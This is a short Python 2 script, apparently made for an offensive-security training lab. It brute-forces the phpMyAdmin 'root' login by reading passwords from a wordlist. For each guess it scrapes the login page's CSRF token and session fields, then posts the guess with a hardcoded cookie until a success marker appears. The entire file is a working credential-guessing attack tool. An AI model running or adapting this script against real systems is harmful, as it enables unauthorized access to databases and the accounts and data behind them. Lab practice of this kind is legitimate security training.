#usr/bin/python2

import sys
import requests
import os
from bs4 import BeautifulSoup

# clean screen
os.system("cls")
os.system("clear")

logo = '''
                 ########################################
                 
                    ------- Bute Force -------
                   	A Suite Portal (challenges)
                   	input only url 
                   	usage : http://ptap-shell.offsec.training:0000
                 ########################################
'''

print (logo)

connect = requests.Session()

url = raw_input("input url ==> ")

file_password = open("passwords.txt",'r')
for line in file_password:
	request = connect.get(url)
	content_page = request.content
	soup = BeautifulSoup(content_page)
	remove_rstrip = line.rstrip("\n")
	for token in soup.find_all(attrs={"name":"token"}, limit=1):
    		for session in soup.find_all(attrs={"name":"set_session"},limit=1):
    			header = {"Cookie":"PHPSESSID=308f56771e83388c1c9069116054e80e;phpMyAdmin=2053emnle3fj9djv4av0eucir8"}
    			data = {"pma_username":"root","pma_password":remove_rstrip,"token":token['value'],"set_session":session['value']}
    			request = connect.post(url+"/index.php",data=data, headers=header)
    			content_page = request.content
    			if "PWK" in content_page:
    				print(content_page)
    				sys.exit(0)
    			else:
    				print("Password is "+str(line)+" Content-Length = ", len(content_page))
